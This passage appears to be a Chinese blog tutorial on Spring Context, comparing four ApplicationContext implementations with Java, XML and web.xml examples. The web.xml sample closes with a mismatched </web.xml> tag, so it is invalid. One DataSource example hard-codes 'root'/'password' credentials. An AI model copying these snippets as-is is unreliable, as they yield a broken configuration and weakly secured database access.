                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">深度详解Spring Context</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7723bfb345a4c2eab39754b86a7781a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769485019&amp;x-signature=k2wElk9obQ9tmFe0xXx%2FuDdzvks%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>每个Spring开发者都离不开Context，但你真的了解它吗？</p>
</blockquote>
<h2 data-id="heading-1">引言：Spring Context 的核心地位</h2>
<p>Spring Context作为Spring框架的核心组件，是IoC容器的具体实现。它就像一个巨大的工厂，负责管理所有的Bean对象，控制它们的生命周期，并解决它们之间的依赖关系。</p>
<h2 data-id="heading-2">什么是Spring Context？</h2>
<p>Spring Context是Spring框架的核心容器，它继承自<code>BeanFactory</code>接口，但在其基础上增加了企业级应用所需的功能：</p>
<ul>
<li>国际化支持</li>
<li>事件传播机制</li>
<li>资源加载</li>
<li>AOP集成</li>
<li>事务管理</li>
</ul>
<h2 data-id="heading-3">四大ApplicationContext全解析</h2>
<h3 data-id="heading-4">1️⃣ AnnotationConfigApplicationContext - Java配置的王者</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7cfc620b85a84f69bdff81aafc428b7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769485019&amp;x-signature=HuyKzJRT9%2BamoC7SS8rcIV%2BjSyA%3D" alt="" loading="lazy"/></p>
<p><strong>适用场景：</strong></p>
<ul>
<li>现代Spring Boot应用</li>
<li>纯Java配置的项目</li>
<li>需要类型安全的配置</li>
</ul>
<p><strong>核心特点：</strong></p>
<ul>
<li>完全基于注解的配置方式</li>
<li>支持Java 8的Lambda表达式</li>
<li>与Spring Boot无缝集成</li>
</ul>
<p><strong>实战代码示例：</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Configuration</span>
<span class="hljs-variable">@ComponentScan</span>(<span class="hljs-string">"com.example.service"</span>)
<span class="hljs-variable">@PropertySource</span>(<span class="hljs-string">"classpath:application.properties"</span>)
public class AppConfig {

    <span class="hljs-variable">@Value</span>(<span class="hljs-string">"${app.name}"</span>)
    private String appName;

    <span class="hljs-variable">@Bean</span>
    <span class="hljs-variable">@Scope</span>(ConfigurableBeanFactory.SCOPE_PROTOTYPE)
    public UserService <span class="hljs-built_in">userService</span>() {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">UserServiceImpl</span>();
    }

    @<span class="hljs-selector-tag">Bean</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">DataSource</span> <span class="hljs-selector-tag">dataSource</span>() {
        <span class="hljs-selector-tag">HikariDataSource</span> <span class="hljs-selector-tag">dataSource</span> = <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">HikariDataSource</span>();
        <span class="hljs-selector-tag">dataSource</span><span class="hljs-selector-class">.setJdbcUrl</span>(<span class="hljs-string">"jdbc:mysql://localhost:3306/mydb"</span>);
        <span class="hljs-selector-tag">dataSource</span><span class="hljs-selector-class">.setUsername</span>(<span class="hljs-string">"root"</span>);
        <span class="hljs-selector-tag">dataSource</span><span class="hljs-selector-class">.setPassword</span>(<span class="hljs-string">"password"</span>);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">dataSource</span>;
    }
}

<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">MainApplication</span> {
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">static</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">main</span>(String[] args) {
        <span class="hljs-comment">// 创建上下文</span>
        <span class="hljs-selector-tag">ApplicationContext</span> <span class="hljs-selector-tag">context</span> =
            <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">AnnotationConfigApplicationContext</span>(AppConfig.class);

        <span class="hljs-comment">// 获取Bean</span>
        <span class="hljs-selector-tag">UserService</span> <span class="hljs-selector-tag">userService</span> = <span class="hljs-selector-tag">context</span><span class="hljs-selector-class">.getBean</span>(UserService.class);
        <span class="hljs-selector-tag">DataSource</span> <span class="hljs-selector-tag">dataSource</span> = <span class="hljs-selector-tag">context</span><span class="hljs-selector-class">.getBean</span>(DataSource.class);

        <span class="hljs-comment">// 使用服务</span>
        <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.processUser</span>();
    }
}
</code></pre>
<p><strong>生产环境应用：</strong> 在Spring Boot项目中，我们通常通过<code>@SpringBootApplication</code>注解自动创建<code>AnnotationConfigApplicationContext</code>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">SpringApplication</span>.<span class="hljs-title function_">run</span>(<span class="hljs-title class_">MyApplication</span>.<span class="hljs-property">class</span>, args);
    }
}
</code></pre>
<h3 data-id="heading-5">2️⃣ ClassPathXmlApplicationContext - 类路径XML配置</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ee8f6b7ded249d79a2d85b704f0e375~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769485019&amp;x-signature=zj5DYJ6PYTgQqpDFskRcH3O8QT0%3D" alt="" loading="lazy"/></p>
<p><strong>适用场景：</strong></p>
<ul>
<li>传统Spring应用</li>
<li>需要与XML配置兼容</li>
<li>类路径资源管理</li>
</ul>
<p><strong>核心特点：</strong></p>
<ul>
<li>从类路径加载XML配置文件</li>
<li>支持通配符配置</li>
<li>兼容性好</li>
</ul>
<p><strong>实战代码示例：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XmlConfigApp</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 1. 基础用法</span>
        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">"applicationContext.xml"</span>);

        <span class="hljs-comment">// 2. 多配置文件</span>
        String[] configLocations = {
            <span class="hljs-string">"spring-datasource.xml"</span>,
            <span class="hljs-string">"spring-service.xml"</span>,
            <span class="hljs-string">"spring-mvc.xml"</span>
        };
        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context2</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(configLocations);

        <span class="hljs-comment">// 3. 使用通配符</span>
        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context3</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">"classpath*:spring/*.xml"</span>);

        <span class="hljs-comment">// 获取Bean</span>
        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> context.getBean(UserService.class);
    }
}
</code></pre>
<p><strong>XML配置文件示例：</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- applicationContext.xml --&gt;</span>
<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.springframework.org/schema/beans"</span>
       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">"http://www.springframework.org/schema/context"</span>
       <span class="hljs-attr">xmlns:tx</span>=<span class="hljs-string">"http://www.springframework.org/schema/tx"</span>
       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"
           http://www.springframework.org/schema/beans
           http://www.springframework.org/schema/beans/spring-beans.xsd
           http://www.springframework.org/schema/context
           http://www.springframework.org/schema/context/spring-context.xsd
           http://www.springframework.org/schema/tx
           http://www.springframework.org/schema/tx/spring-tx.xsd"</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 组件扫描 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">"com.example"</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- 属性文件 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">context:property-placeholder</span> <span class="hljs-attr">location</span>=<span class="hljs-string">"classpath:application.properties"</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- 数据源配置 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"dataSource"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.zaxxer.hikari.HikariDataSource"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"driverClassName"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${db.driver}"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"jdbcUrl"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${db.url}"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${db.username}"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${db.password}"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- JPA配置 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"entityManagerFactory"</span>
          <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"dataSource"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"dataSource"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"packagesToScan"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"com.example.entity"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"jpaVendorAdapter"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"jpaProperties"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">props</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">props</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 事务管理器 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"transactionManager"</span>
          <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.orm.jpa.JpaTransactionManager"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"entityManagerFactory"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"entityManagerFactory"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 启用事务注解 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tx:annotation-driven</span> <span class="hljs-attr">transaction-manager</span>=<span class="hljs-string">"transactionManager"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span>
</code></pre>
<h3 data-id="heading-6">3️⃣ FileSystemXmlApplicationContext - 文件系统XML配置</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7b81c3f101f4d91bb38e23fb12bb9c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769485019&amp;x-signature=C%2FdyOQxV%2B540HH46ocW9B3vAl6Y%3D" alt="" loading="lazy"/></p>
<p><strong>适用场景：</strong></p>
<ul>
<li>外部配置文件管理</li>
<li>开发环境快速配置</li>
<li>多环境部署</li>
</ul>
<p><strong>核心特点：</strong></p>
<ul>
<li>从文件系统加载配置文件</li>
<li>支持绝对路径</li>
<li>便于外部配置管理</li>
</ul>
<p><strong>实战代码示例：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileSystemConfigApp</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 1. 使用绝对路径</span>
        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context1</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSystemXmlApplicationContext</span>(
                <span class="hljs-string">"C:/config/spring/applicationContext.xml"</span>);

        <span class="hljs-comment">// 2. 使用多个配置文件</span>
        String[] configPaths = {
            <span class="hljs-string">"/opt/spring/config/datasource.xml"</span>,
            <span class="hljs-string">"/opt/spring/config/service.xml"</span>
        };
        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context2</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSystemXmlApplicationContext</span>(configPaths);

        <span class="hljs-comment">// 3. 相对路径（不推荐，路径不明确）</span>
        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context3</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSystemXmlApplicationContext</span>(<span class="hljs-string">"config/spring.xml"</span>);

        <span class="hljs-comment">// 使用上下文</span>
        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> context1.getBean(UserService.class);
    }
}
</code></pre>
<p><strong>最佳实践：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigManager</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-title class_">String</span> <span class="hljs-variable constant_">CONFIG_DIR</span> = <span class="hljs-title class_">System</span>.<span class="hljs-title function_">getProperty</span>(<span class="hljs-string">"user.dir"</span>) + <span class="hljs-string">"/config"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">ApplicationContext</span> <span class="hljs-title function_">createApplicationContext</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> profile</span>) {
        <span class="hljs-title class_">String</span> configPath = <span class="hljs-variable constant_">CONFIG_DIR</span> + <span class="hljs-string">"/application-"</span> + profile + <span class="hljs-string">".xml"</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSystemXmlApplicationContext</span>(configPath);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-comment">// 根据环境创建不同的上下文</span>
        <span class="hljs-title class_">String</span> env = <span class="hljs-title class_">System</span>.<span class="hljs-title function_">getProperty</span>(<span class="hljs-string">"spring.profiles.active"</span>, <span class="hljs-string">"dev"</span>);
        <span class="hljs-title class_">ApplicationContext</span> context = <span class="hljs-title function_">createApplicationContext</span>(env);
    }
}
</code></pre>
<h3 data-id="heading-7">4️⃣ WebApplicationContext - Web应用的守护神</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ed2897170c54fa0b63fd86e374c10da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769485019&amp;x-signature=cK9fTCd5oj4vIe9pTzhSDAgCyDg%3D" alt="" loading="lazy"/></p>
<p><strong>适用场景：</strong></p>
<ul>
<li>Web应用开发</li>
<li>Spring MVC应用</li>
<li>Servlet容器集成</li>
</ul>
<p><strong>核心特点：</strong></p>
<ul>
<li>继承自ApplicationContext</li>
<li>提供Web特有的功能</li>
<li>支持Servlet生命周期集成</li>
</ul>
<p><strong>Web.xml配置示例：</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- web.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://xmlns.jcp.org/xml/ns/javaee"</span>
         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://xmlns.jcp.org/xml/ns/javaee
         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span>
         <span class="hljs-attr">version</span>=<span class="hljs-string">"4.0"</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Context配置 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>
            /WEB-INF/spring/root-context.xml
            /WEB-INF/spring/app-config.xml
        <span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 监听器 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring MVC配置 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>/WEB-INF/spring/servlet-context.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">web.xml</span>&gt;</span>
</code></pre>
<p><strong>Servlet集成示例：</strong></p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// 自定义Servlet</span>
<span class="hljs-meta">@WebServlet</span>(<span class="hljs-string">"/api/users"</span>)
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>{

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">UserService</span> userService;

    <span class="hljs-meta">@Override</span>
    public void init() <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span> {
        <span class="hljs-comment">// 获取WebApplicationContext</span>
        <span class="hljs-type">WebApplicationContext</span> context =
            <span class="hljs-type">WebApplicationContextUtils</span>.getWebApplicationContext(
                getServletContext());

        <span class="hljs-comment">// 手动注入（不推荐，应该使用注解）</span>
        <span class="hljs-keyword">if</span> (userService == <span class="hljs-literal">null</span>) {
            userService = context.getBean(<span class="hljs-type">UserService</span>.<span class="hljs-keyword">class</span>);
        }
    }

    <span class="hljs-keyword">protected</span> void doGet(<span class="hljs-type">HttpServletRequest</span> request,
                        <span class="hljs-type">HttpServletResponse</span> response) {
        <span class="hljs-type">List</span>&lt;<span class="hljs-type">User</span>&gt; users = userService.getAllUsers();
        <span class="hljs-comment">// 返回JSON响应</span>
    }
}

<span class="hljs-comment">// 使用注解的控制器</span>
<span class="hljs-meta">@Controller</span>
<span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">"/api"</span>)
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiController</span> </span>{

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">UserService</span> userService;

    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/users"</span>)
    <span class="hljs-meta">@ResponseBody</span>
    public <span class="hljs-type">List</span>&lt;<span class="hljs-type">User</span>&gt; getUsers() {
        <span class="hljs-keyword">return</span> userService.getAllUsers();
    }
}
</code></pre>
<h2 data-id="heading-8">生产环境实战：微服务架构中的Spring Context</h2>
